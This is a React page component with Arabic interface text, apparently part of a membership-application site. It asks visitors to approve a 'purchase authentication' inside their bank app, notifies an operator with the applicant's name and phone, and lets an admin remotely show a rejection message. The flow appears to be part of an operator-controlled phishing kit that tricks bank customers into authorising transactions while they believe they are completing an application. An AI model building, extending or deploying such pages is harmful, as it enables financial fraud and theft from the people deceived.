import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { useApp, SESSION_KEY } from '@/contexts/AppContext';
import { trpc } from '@/lib/trpc';
import LoadingOverlay from '@/components/LoadingOverlay';
import WaitingModal from '@/components/WaitingModal';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

const BANK_AUTH_IMG = '/manus-storage/bank-auth-mockup_caa449c5.png';

export default function BankAuth() {
  const [, navigate] = useLocation();
  const { appData, saveApplication, isLoading, setIsLoading, adminRedirectPage, setAdminRedirectPage } = useApp();
  const [submitted, setSubmitted] = useState(false);
  const [rejectionMessage, setRejectionMessage] = useState('');
  const confirmBankAuthMutation = trpc.applications.confirmBankAuth.useMutation();
  const notifyMutation = trpc.system.notifyOwner.useMutation();

  // استماع لأمر الرفض من المسؤول عبر adminRedirectPage
  useEffect(() => {
    if (!adminRedirectPage) return;
    if (adminRedirectPage.includes('/bank-auth') && adminRedirectPage.includes('rejected=true')) {
      setAdminRedirectPage(''); // مسح التوجيه
      setSubmitted(false);      // إخفاء WaitingModal
      setRejectionMessage('عذراً ... لم يكتمل طلبك لعدم تأكيد الطلب من داخل التطبيق البنكي');
    }
  }, [adminRedirectPage]);

  const handleApproved = async () => {
    setIsLoading(true);
    const sessionId = localStorage.getItem(SESSION_KEY) || '';

    try {
      // حفظ الصفحة الحالية في قاعدة البيانات
      await saveApplication({ currentPage: '/bank-auth' });

      // تأكيد المصادقة البنكية في قاعدة البيانات
      if (sessionId) {
        await confirmBankAuthMutation.mutateAsync({ sessionId });
      }

      // إرسال إشعار للمسؤول بتأكيد الطلب
      notifyMutation.mutate({
        title: '✅ تم تأكيد الطلب - المصادقة البنكية',
        content: `مقدم الطلب: ${appData.fullName || 'غير محدد'}\nالهاتف: ${appData.phone || 'غير محدد'}\nنوع العضوية: ${appData.membershipType || 'غير محدد'}\n\n✅ تم تأكيد المصادقة البنكية.\nيرجى قبول أو رفض الطلب من لوحة التحكم.`,
      })
    } catch (err) {
      console.error('[BankAuth] Error:', err);
    } finally {
      setIsLoading(false);
      setSubmitted(true);
    }
  };

  // Submitted / waiting screen
  if (submitted) {
    return (
      <div className="min-h-screen flex flex-col" style={{ background: '#F0F4FA', fontFamily: 'Cairo, sans-serif' }}>
        <Header />
        <main className="flex-1" />
        <Footer />
        <WaitingModal />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ background: '#F0F4FA', fontFamily: 'Cairo, sans-serif' }}>
      {isLoading && <LoadingOverlay />}
      <Header />

      <main className="flex-1 flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-2xl">
          <img
            src={BANK_AUTH_IMG}
            alt="مصادقة الشراء من داخل التطبيق البنكي"
            className="w-full h-auto rounded-2xl"
            style={{ boxShadow: '0 8px 40px rgba(29,74,145,0.15)', display: 'block' }}
          />
        </div>

        <div className="w-full max-w-sm mt-8">
          {rejectionMessage && (
            <div className="mb-4 p-4 rounded-lg" style={{ background: 'rgba(215,38,56,0.15)', border: '1px solid #D72638' }}>
              <p className="text-center text-sm" style={{ color: '#D72638', fontFamily: 'Cairo, sans-serif', lineHeight: '1.6' }}>
                {rejectionMessage}
              </p>
            </div>
          )}
          <button
            onClick={handleApproved}
            disabled={isLoading}
            className="w-full py-4 rounded-2xl font-black text-white text-lg transition-all duration-200"
            style={{
              background: isLoading
                ? 'linear-gradient(135deg, #9CA3AF, #6B7280)'
                : 'linear-gradient(135deg, #1D4A91, #2563EB)',
              boxShadow: '0 4px 20px rgba(29,74,145,0.35)',
              border: 'none',
              cursor: isLoading ? 'not-allowed' : 'pointer',
              fontFamily: 'Cairo, sans-serif',
            }}
            onMouseEnter={e => {
              if (!isLoading) e.currentTarget.style.boxShadow = '0 6px 30px rgba(29,74,145,0.55)';
            }}
            onMouseLeave={e => {
              e.currentTarget.style.boxShadow = '0 4px 20px rgba(29,74,145,0.35)';
            }}
          >
            {isLoading ? 'جاري التحقق...' : 'تم التحقق — المتابعة'}
          </button>
          <p
            className="text-center mt-3 text-sm"
            style={{ color: '#888', fontFamily: 'Cairo, sans-serif' }}
          >
            بعد الموافقة على طلب المصادقة في تطبيق البنك، اضغط على الزر أعلاه للمتابعة
          </p>
        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
        @keyframes bounce { 0%,80%,100%{transform:translateY(0)} 40%{transform:translateY(-10px)} }
      `}</style>
    </div>
  );
}
